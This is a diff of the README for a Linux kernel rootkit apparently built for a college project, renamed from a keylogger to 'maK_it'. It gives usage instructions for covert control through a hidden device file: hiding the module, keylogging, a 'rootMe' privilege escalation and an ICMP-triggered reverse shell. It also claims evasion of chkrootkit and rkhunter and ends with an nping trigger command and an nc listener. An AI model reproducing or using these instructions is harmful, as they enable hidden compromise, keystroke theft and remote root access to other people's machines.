@@ -1,22 +1,16 @@
-stealthy-Keylogger-lkm
+maK_it-Linux-Rootkit
 ========================
 
-This is a very simple Keylogger implementation, and is part of a college project
-at http://blogs.computing.dcu.ie/wordpress/mak0/
+This is a simple rootkit implementation for the project described
+at the following locations
+http://blogs.computing.dcu.ie/wordpress/mak0/
+http://r00tkit.me
 
-This is the 2nd implementation of my keylogger, this one allows the module to 
-be hidden and also demonstrates how our rootkit could take simple commands.
+This rootkit avoids both the chkrootkit & rkhunter scanners as intended.
+It is fully compatible with the latest version of CentOS 6.5
 
-This demonstrates an introduction to simple methods of concealing our rootkit.
 
 To run simply run "make" in the folder with the Makefile.
-
-There is also the option of running scripts/lets_mak_it.sh
-This takes 2 arguments, the name of the device to appear in /dev/DEVICE_NAME
-and a major number for the device. By default it used a device name of
-maK_it and a major number of 33.
-
-To view the logged keys cat /dev/maK_it
 
 install with 
 insmod maK_it.ko
@@ -24,32 +18,24 @@ insmod maK_it.ko
 Remove with 
 rmmod maK_it
 
-Building towards development of a rootkit...
 
 ===============
 Demo Commands
 ===============
-Hide the module: echo modHide > /dev/.maK_it
+Echo any of the following into /dev/.maK_it
 
-Reveal the module: echo modReveal > /dev/.maK_it
+debug - turn /var/log/messages debug messages on or off.
+keyLogOn - turn the keylogger on
+keyLogOff - turn the keylogger off
+modHide - hide the module (hidden by default in insmod)
+modReveal - reveal the module (so you can rmmod it)
+rootMe - give root privileges to user
+shellUp - Turn on a packet sniffer for reverse shell icmp
+shellDown - Turn off the packet sniffer daemon
 
-We can confirm the module is hidden by running some of the following:
+To trigger the reverse shell, listen on a port of your choice
+on your own machine. The shell will be returned if you send an 
+icmp packet with the right trigger word, your ip/port.
 
-lsmod | grep maK
-
-grep maK /proc/modules
-
-grep maK_it /proc/kallsyms
-
-ls /sys/module | grep maK
-
-modinfo maK_it
-
-modprobe -c | grep maK
-
-
-Turn Key logger on: echo keyLogOn > /dev/.maK_it
-
-Turn Key logger off: echo keyLogOff > /dev/.maK_it
-
-Turn debug on/off: echo debug > /dev/.maK_it
+Example: nping --icmp -c 1 -dest-ip 127.0.0.1 --data-string 'maK_it_$H3LL 127.0.0.1 31337'
+A port listener can be simply opened on your machine using nc -l 31337
